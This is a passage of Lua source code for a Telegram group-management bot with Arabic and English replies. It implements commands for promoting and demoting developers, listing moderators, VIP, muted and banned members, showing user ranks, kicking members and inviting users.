            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم رفعه مطور فالرتبه الثالثه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          end
          database:sadd('bot:admins:', ap[2])
        end
        ----------------------------------------faeder-------------------------------------------------------
        local text = msg.content_.text_:gsub('تنزيل مطور رتبه ثالثه','remdev3')
        if text:match("^[Rr]emdev3$") and is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
          function deadmin_by_reply(extra, result, success)
            local hash = 'bot:admins:'
            if not database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه مطور ثالث سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:srem(hash, result.sender_user_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| removed from Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المطور الثالث ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,deadmin_by_reply)
        end
        -------------------------------------------faeder----------------------------------------------------
        if text:match("^[Rr]emdev3 @(.*)$") and is_sudo(msg) then
          local hash = 'bot:admins:'
          local ap = {string.match(text, "^([Rr]emdev3) @(.*)$")}
          function remadmin_by_username(extra, result, success)
            if result.id_ then
              database:srem(hash, result.id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| removed from Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '🎈|| المطور الثالث ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🚦|| Username is not correct ❎*'
              else
                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
          end
          resolve_username(ap[2],remadmin_by_username)
        end
        -------------------------------------faeder----------------------------------------------------------
        if text:match("^[Rr]emdev3 (%d+)$") and is_sudo(msg) then
          local hash = 'bot:admins:'
          local ap = {string.match(text, "^([Rr]emdev3) (%d+)$")}
          database:srem(hash, ap[2])
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| removed from Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المطور الثالث ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          end
        end
        --------------------------------------faeder---------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Mm]odlist$") or text:match("^الادمنيه$") then
            local hash =  'bot:momod:'..msg.chat_id_
            local list = database:smembers(hash)
            if database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ List of moderator 🔽 \n\n"
            else
              text = "🚦⁞ قائمه الادمنيه 🔽 \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~ ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ List of moderator is empty ☑️"
              else
                text = "🚦⁞ لا يوجد ادمنيه ☑️"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          if text:match("^[Mm]odalllist$") or text:match("^الادمنيه العامين$") then
            local hash =  'bot:moall:'
            local list = database:smembers(hash)
            if database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ List of moderator all🔽 \n\n"
            else
              text = "🚦⁞ قائمه الادمنيه العامين 🔽 \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~ ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ List of moderator all is empty ☑️"
              else
                text = "🚦⁞ لا يوجد ادمنيه عامين ☑️"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          --------------------------------faeder-------------------------------------------
          if text:match("^[Vv]iplist$") or text:match("^الاعضاء المميزين$") then
            local hash =  'bot:vipmem:'..msg.chat_id_
            local list = database:smembers(hash)
            if database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ List of VIP Members 🔽 : \n\n"
            else
              text = "🚦⁞ قائمه الاعضاء المميزين 🔽 : \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~ ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ List of VIP members is empty ☑️"
              else
                text = "🚦⁞ لا يوجد مميزين ☑️"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          --------------------------------faeder-------------------------------------------
          if text:match("^[Dd]onkylist$") or text:match("^قائمه المطايه$") or text:match("^المطايه$") then
            local hash =  'bot:donky:'..msg.chat_id_
            local list = database:smembers(hash)
            if database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ List of donky 🔽 : \n\n"
            else
              text = "🚦⁞ قائمه المطاية الكروب😹😔 🔽 : \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~ ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ List of donky is empty ☑️"
              else
                text = "🚦⁞ عجيب 😳😹 هذا الكروب كله اوادم ما بي مطايه 😹😔"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          --------------------------------faeder-------------------------------------------
          if text:match("^[Vv]ipalllist$") or text:match("^المميزين عام$") or text:match("^الاعضاء المميزين عام$") then
            local hash =  'bot:vpall:'
            local list = database:smembers(hash)
            if database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ List of VIP Members all🔽 : \n\n"
            else
              text = "🚦⁞ قائمه الاعضاء المميزين عام 🔽 : \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~ ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ List of VIP members all is empty ☑️"
              else
                text = "🚦⁞ لا يوجد مميزين عام ☑️"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          ------------------------------------------faeder-----------------------------------------------------
          if text:match("^[Mm]utelist$") or text:match("^المكتومين$") then
            local hash =  'bot:muted:'..msg.chat_id_
            local list = database:smembers(hash)
            if database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ List of muted users 🔽 : \n\n"
            else
              text = "🚦⁞ قائمه المكتومين 🔽 : \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~ ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ List of muted users is empty ☑️"
              else
                text = "🚦⁞ لا يوجد مكتومين ☑️"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          ----------------------------------faeder-------------------------------------------------------------
          if text:match("^[Oo]wner$") or text:match("^[Oo]wnerlist$") or text:match("^المدير$") or text:match("^المدراء$") then
            local hash =  'bot:owners:'..msg.chat_id_
            local list = database:smembers(hash)
            if not database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ قائمه المدراء 🔽 : \n\n"
            else
              text = "🚦⁞ Owners list 🔽 : \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~ ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ Owner list is empty ☑️"
              else
                text = "🚦⁞ لا يوجد مدراء ☑️"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          ---------------------------------faeder------------
          if text:match("^[Oo]wnerall$") or text:match("^[Oo]wneralllist$") or text:match("^المدراء العامين$") or text:match("^المدير العام$") then
            local hash =  'bot:onall:'
            local list = database:smembers(hash)
            if not database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ قائمه المدراء العامين 🔽 : \n\n"
            else
              text = "🚦⁞ Owners all list 🔽 : \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~ ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ Owner all list is empty ☑️"
              else
                text = "🚦⁞ لا يوجد مدراء عامين ☑️"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          ----------------------------------------faeder--------------
          if text:match("^[mM]onsh$") or text:match("^[Mm]onshlist$") or text:match("^المنشئ$") or text:match("^المنشئين$") then
            local hash =  'bot:monsh:'..msg.chat_id_
            local list = database:smembers(hash)
            if not database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ قائمه المنشئين 🔽 : \n\n"
            else
              text = "🚦⁞ monsh list 🔽 : \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~ ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ Monsh list is empty ☑️"
              else
                text = "🚦⁞ لا يوجد المنشئين ☑️"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          ----------------------------------------faeder-------------------------------------------------------
          if text:match("^[Bb]anlist$") or text:match("^المحظورين$") then
            local hash =  'bot:banned:'..msg.chat_id_
            local list = database:smembers(hash)
            if database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ List of banlist 🔽 : \n\n"
            else
              text = "🚦⁞ قائمه المحظورين 🔽 : \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~ ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ list of banlist is empty ☑️"
              else
                text = "🚦⁞ لا يوجد محظورين ☑️"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
        end
        ---------------------------------faedrr--------------------------------------------------------------
     if is_sudo(msg) and (text:match("^[Ss]etsupport$") or text:match("^ضع دعم$")) then
          if database:get("lang:gp:" .. msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞  Please Send your *Support link* Or *Support Bot ID* now •", 1, "md")
          else
            faederdx(msg.chat_id_, msg.id_, 1, "️🚦⁞ ارسل لي رابط كروب الدعم •\n🚏⁞  او قم بارسال المعرف الذي تود ان يتواصل معك متابعيك من خلاله •", 1, "md")
          end
          database:setex("bot:support:link" .. msg.sender_user_id_, 120, true)
        end
        if is_sudo(msg) and (text:match("^[Dd]elsupport$") or text:match("^حذف الدعم$")) then
          if database:get("lang:gp:" .. msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Support *Information* Deleted •", 1, "md")
          else
            faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حذف معلومات الدعم •", 1, "md")
          end
          database:del("bot:supports:link")
        end
          --------faeder
          if is_sudo(msg) then
          if text:match("^[Bb]analllist$") or text:match("^قائمه العام$") then
            local hash =  'bot:gban:'
            local list = database:smembers(hash)
            if database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ List of banlist 🔽 : \n\n"
            else
             text = "🚦⁞ قائمه الحظر العام 🔽 : \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~ ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ list of banalllist is empty ☑️"
              else
                text = "🚦⁞ لا يوجد محظورين عام ☑️"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
        end
        ---------------------------------------fadeer--------------------------------------------------------
        if text:match("^[Ss]udodev3$") or text:match("^مطورين الرتبه الثالثه$") and is_leader(msg) then
          local hash =  'bot:admins:'
          local list = database:smembers(hash)
          if database:get('lang:gp:'..msg.chat_id_) then
            text = "🚦⁞ List of sudo dev 3 🔽 :\n\n"
          else
            text = "🚦⁞ مطورين الرتبه الثالثه 🔽 :\n\n"
          end
          for k,v in pairs(list) do
            local user_info = database:hgetall('user:'..v)
            if user_info and user_info.username then
              local username = user_info.username
              text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
            else
              text = text..k.." ~ ⁞ "..v.."\n"
            end
          end
          if #list == 0 then
            if database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ List of sudo dev 3 is empty ☑️"
            else
              text = "🚦⁞ لا يوجد مطورين بهذه الرتبه ☑️"
            end
          end
          faederdx(msg.chat_id_, msg.id_, 1, text, 'html')
        end
        ------------------------------------faeder-----------------------------------------------------------
        if text:match("^[Ii]d$") or text:match("^ايدي$") and msg.reply_to_message_id_ ~= 0 then
          function id_by_reply(extra, result, success)
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ID user ~ "..result.sender_user_id_, 1, 'md')
            else
           faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ايدي العضو ~ "..result.sender_user_id_, 1, 'md')
            end
          end
          getMessage(msg.chat_id_,msg.reply_to_message_id_,id_by_reply)
        end
        
          if text:match("^رتبته @(.*)$") then
            local ap = {string.match(text, "^(رتبته) @(.*)$")}
            function id_by_username(extra, result, success)
              if result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  if tonumber(result.id_) == tonumber(bot_owner) then
                    t = 'Sudo all'
                  elseif is_sudoid(result.id_) then
                    t = 'Sudo 2'
                  elseif is_admin(result.id_) then
                    t = 'sudo 3'
                    elseif is_monsh(result.id_, msg.chat_id_) then
                    t = 'monsh'
                    elseif is_onall(result.id_) then
                     t = 'owner all'
                     elseif is_moall(result.id_) then
                     t = 'modod all'
                     elseif is_vpall(result.id_) then
                     t = 'vip all'
                  elseif is_owner(result.id_, msg.chat_id_) then
                    t = 'Owner'
                    elseif is_donky(result.id_, msg.chat_id_) then
                    t = 'Full donky'
                  elseif is_momod(result.id_, msg.chat_id_) then
                    t = 'Bot Admin'
                  elseif result.id_ == bot_id then
                    t = 'Myself'
                  else
                    t = 'Member'
                  end
                end
                if not database:get('lang:gp:'..msg.chat_id_) then
                  if tonumber(result.id_) == tonumber(bot_owner) then
                   t = 'مطور اساسي'
                  elseif is_sudoid(result.id_) then
                    t = 'مطور ثانوي'
                  elseif is_admin(result.id_) then
                    t = 'مطور فالرتبه الثالثه'
                    elseif is_monsh(result.id_, msg.chat_id_) then
                    t = 'منشئ الكروب'
                    elseif is_onall(result.id_) then
                    t = 'مدير عام'
                    elseif is_moall(result.id_) then
                     t = 'ادمن عام'
                     elseif is_vpall(result.id_) then
                     t = 'مميز عام'
                     elseif is_donky(result.id_, msg.chat_id_) then
                    t = 'مطي محمل طحين 😹😔'
                  elseif is_owner(result.id_, msg.chat_id_) then
                    t = 'مدير البوت'
                  elseif is_momod(result.id_, msg.chat_id_) then
                    t = 'ادمن البوت'
                  elseif result.id_ == bot_id then
                    t = 'هذا انا البوت'
                  else
                    t = 'عضو فقط'
                  end
                end
                local gpid = tostring(result.id_)
                if gpid:match('^(%d+)') then
                  if database:get('lang:gp:'..msg.chat_id_) then
                    text = '💳⁞ rank ~ « '..t
                  else
                    text = '💳⁞ رتـبتـه ~ « '..t
                  end
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    text = '🚦• this channel or group •\n🎖• is not have rank •'
                  else
                    text = '🚦• هذه قناة او كروب •\n🎖• ليس له رتبه •'
                  end
                end
              end
              if not result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = '🚦⁞ Username is not correct ☑️'
                else
                  text = '🚦⁞ المعرف غير صحيح ☑️'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
            end
            resolve_username(ap[2],id_by_username)
          end
        -----------------------------------faeder------------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ii]d @(.*)$") then
            local ap = {string.match(text, "^([Ii]d) @(.*)$")}
            function id_by_username(extra, result, success)
              if result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  if tonumber(result.id_) == tonumber(bot_owner) then
                    t = 'Sudo all'
                  elseif is_sudoid(result.id_) then
                    t = 'Sudo 2'
                  elseif is_admin(result.id_) then
                    t = 'sudo 3'
                    elseif is_monsh(result.id_, msg.chat_id_) then
                    t = 'monsh'
                    elseif is_onall(result.id_) then
                    t = 'owner all'
                    elseif is_moall(result.id_) then
                     t = 'modod all'
                     elseif is_vpall(result.id_) then
                     t = 'vip all'
                     elseif is_donky(result.id_, msg.chat_id_) then
                    t = 'Full donky'
                  elseif is_owner(result.id_, msg.chat_id_) then
                    t = 'Owner'
                  elseif is_momod(result.id_, msg.chat_id_) then
                    t = 'Bot Admin'
                  elseif result.id_ == bot_id then
                    t = 'Myself'
                  else
                    t = 'Member'
                  end
                end
                if not database:get('lang:gp:'..msg.chat_id_) then
                  if tonumber(result.id_) == tonumber(bot_owner) then
                   t = 'مطور اساسي'
                  elseif is_sudoid(result.id_) then
                    t = 'مطور ثانوي'
                  elseif is_admin(result.id_) then
                    t = 'مطور فالرتبه الثالثه'
                    elseif is_monsh(result.id_, msg.chat_id_) then
                    t = 'منشئ الكروب'
                    elseif is_onall(result.id_) then
                    t = 'مدير عام'
                    elseif is_moall(result.id_) then
                     t = 'ادمن عام'
                     elseif is_vpall(result.id_) then
                     t = 'مميز عام'
                     elseif is_donky(result.id_, msg.chat_id_) then
                    t = 'مطي محمل طحين 😹😔'
                  elseif is_owner(result.id_, msg.chat_id_) then
                    t = 'مدير البوت'
                  elseif is_momod(result.id_, msg.chat_id_) then
                    t = 'ادمن البوت'
                  elseif result.id_ == bot_id then
                    t = 'هذا انا البوت'
                  else
                    t = 'عضو فقط'
                  end
                end
                local gpid = tostring(result.id_)
                if gpid:match('^(%d+)') then
                  if database:get('lang:gp:'..msg.chat_id_) then
                    text = '🚦⁞ user ~ « @'..ap[2]..' »\n🖇⁞ id ~ « `'..result.id_..'` »\n💳⁞ rank ~ « '..t
                  else
                    text = '🚦⁞ معـرفه ~ « @'..ap[2]..' »\n🖇⁞ ايـديـه ~ « `'..result.id_..'` »\n💳⁞ رتـبتـه ~ « '..t
                  end
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    text = '🚦⁞ Channel ~ « @'..ap[2]..' »\n🖇⁞ id ~ « {`'..result.id_..'`}'
                  else
                    text = '🚦⁞ القناة ~ « @'..ap[2]..' »\n🖇⁞ ايديها ~ « {`'..result.id_..'`}'
                  end
                end
              end
              if not result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = '🚦⁞ Username is not correct ☑️'
                else
                  text = '🚦⁞ المعرف غير صحيح ☑️'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
            end
            resolve_username(ap[2],id_by_username)
          end
          if text:match("^ايدي @(.*)$") then
            local ap = {string.match(text, "^(ايدي) @(.*)$")}
            function id_by_username(extra, result, success)
              if result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  if tonumber(result.id_) == tonumber(bot_owner) then
                    t = 'Chief'
                  elseif is_sudoid(result.id_) then
                    t = 'Sudo'
                  elseif is_admin(result.id_) then
                    t = 'sudo3'
                    elseif is_monsh(result.id_, msg.chat_id_) then
                    t = 'monsh'
                    elseif is_onall(result.id_) then
                    t = 'owner all'
                    elseif is_moall(result.id_) then
                     t = 'modod all'
                     elseif is_vpall(result.id_) then
                     t = 'vip all'
                     elseif is_donky(result.id_, msg.chat_id_) then
                    t = 'Full donky'
                  elseif is_owner(result.id_, msg.chat_id_) then
                    t = 'Owner'
                  elseif is_momod(result.id_, msg.chat_id_) then
                    t = 'Group Admin'
                  elseif result.id_ == bot_id then
                    t = 'Myself'
                  else
                    t = 'Member'
                  end
                end
                if not database:get('lang:gp:'..msg.chat_id_) then
                  if tonumber(result.id_) == tonumber(bot_owner) then
                   t = 'مطور اساسي'
                  elseif is_sudoid(result.id_) then
                    t = 'مطور ثانوي'
                  elseif is_admin(result.id_) then
                    t = 'مطور فالرتبه الثالثه 🚩'
                    elseif is_monsh(result.id_, msg.chat_id_) then
                    t = 'منشئ الكروب'
                    elseif is_onall(result.id_) then
                    t = 'مدير عام'
                    elseif is_moall(result.id_) then
                     t = 'ادمن عام'
                     elseif is_vpall(result.id_) then
                     t = 'مميز عام'
                     elseif is_donky(result.id_, msg.chat_id_) then
                    t = 'مطي محمل طحين 😹😔'
                  elseif is_owner(result.id_, msg.chat_id_) then
                    t = 'مدير البوت'
                  elseif is_momod(result.id_, msg.chat_id_) then
                    t = 'ادمن البوت'
                  elseif result.id_ == bot_id then
                    t = 'هذا انا البوت'
                  else
                    t = 'عضو فقط'
                  end
                end
                local gpid = tostring(result.id_)
                if gpid:match('^(%d+)') then
                  if database:get('lang:gp:'..msg.chat_id_) then
                    text = '🚦⁞ user ~ « @'..ap[2]..' »\n🖇⁞ id ~ « `'..result.id_..'` »\n💳⁞ rank ~ « '..t
                  else
                    text = '🚦⁞ معـرفه ~ « @'..ap[2]..' »\n🖇⁞ ايـديـه ~ « `'..result.id_..'` »\n💳⁞ رتـبتـه ~ « '..t
                  end
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    text = '🚦⁞ Channel ~ « @'..ap[2]..' »\n🖇⁞ id ~ « {`'..result.id_..'`}'
                  else
                    text = '🚦⁞ القناة ~ « @'..ap[2]..' »\n🖇⁞ ايديها ~ « {`'..result.id_..'`}'
                  end
                end
              end
              if not result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = '🚦⁞ Username is not correct ☑️'
                else
                  text = '🚦⁞ المعرف غير صحيح ☑️'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
            end
            resolve_username(ap[2],id_by_username)
          end
          -----------------------------------------------faeder------------------------------------------------
          local text = msg.content_.text_:gsub('طرد','Kick')
          if text:match("^[Kk]ick$") and msg.reply_to_message_id_ ~= 0 then
            function kick_reply(extra, result, success)
              if not is_momod(result.sender_user_id_, result.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The user ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been kicked ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم طرده من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
                chat_kick(result.chat_id_, result.sender_user_id_)
              end
            end
            getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
          end
          --------------------------faeder-------------------------------
          if text:match("^[Kk]ick @(.*)$") then
            local ap = {string.match(text, "^([Kk]ick) @(.*)$")}
            function ban_by_username(extra, result, success)
              if result.id_ then
                if not is_momod(result.id_, msg.chat_id_) then
                  if database:get('lang:gp:'..msg.chat_id_) then
                    texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been kicked ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                  else
                    texts = '*🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم طرده من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                  end
                  chat_kick(msg.chat_id_, result.id_)
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| Username is not correct ❎*'
                else
                  text = '*🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
            end
            resolve_username(ap[2],ban_by_username)
          end
          ------------------------------faeder-----------------------------------------------------------------
          if text:match("^[Kk]ick (%d+)$") then
            local ap = {string.match(text, "^([Kk]ick) (%d+)$")}
            if not is_momod(ap[2], msg.chat_id_) then
              chat_kick(msg.chat_id_, ap[2])
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The user ؛ '..ap[2]..' ، 🚷\n🎈|| has been kicked ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم طرده من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          -----------------------------------faeder-----------------------------------------------------------
          if text:match("^[Ff]ilterlist$") or text:match("^قائمه المنع$") then
            local hash = 'bot:filters:'..msg.chat_id_
            if hash then
              local names = database:hkeys(hash)
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ Filterlist 🔽 : \n\n"
              else
                text = "🚦⁞ قائمه الكلمات الممنوعه 🔽 : \n\n"
              end
              for i=1, #names do
                text = text..'~ ⁞ '..names[i]..'\n'
              end
              if #names == 0 then
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = "🚦⁞ Filterlist is empty ☑️"
                else
                  text = "🚦⁞ لا يوجد كلمات ممنوعه ☑️"
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
            end
          end
          ----------------------------------faeder-------------------------------------------------------------
          if text:match("^[Ff]ilterall list$") or text:match("^قائمه المنع العام$") then
            local hash = 'bot:freewords:'
            if hash then
              local names = database:hkeys(hash)
              if database:get('lang:gp:'..msg.chat_id_) then
                text = '🚦⁞ Filter all list 🔽 : \n\n'
              else
                text = '🚦⁞ قائمه المنع العام 🔽 : \n\n'
              end
              for i=1, #names do
                text = text..' ~ ⁞ '..names[i]..'\n'
              end
              if #names == 0 then
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = "🚦⁞ Filter all list is empty ☑️"
                else
                  text = "🚦⁞ لا يوجد كلمات ممنوعه عام ☑️"
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
            end
          end
          ----------------------------------------faeder-------------------------------------------------------
          local text = msg.content_.text_:gsub('اضافه','Invite')
          if text:match("^[Ii]nvite$") and msg.reply_to_message_id_ ~= 0 then
            function inv_reply(extra, result, success)
              add_user(result.chat_id_, result.sender_user_id_, 5)
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,inv_reply)
          end
          -----------------------------------faeder------------------------------------------------------------
          if text:match("^[Ii]nvite @(.*)$") then
            local ap = {string.match(text, "^([Ii]nvite) @(.*)$")}
            function invite_by_username(extra, result, success)
              if result.id_ then
                add_user(msg.chat_id_, result.id_, 5)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  texts = '🚦|User not found '
                else
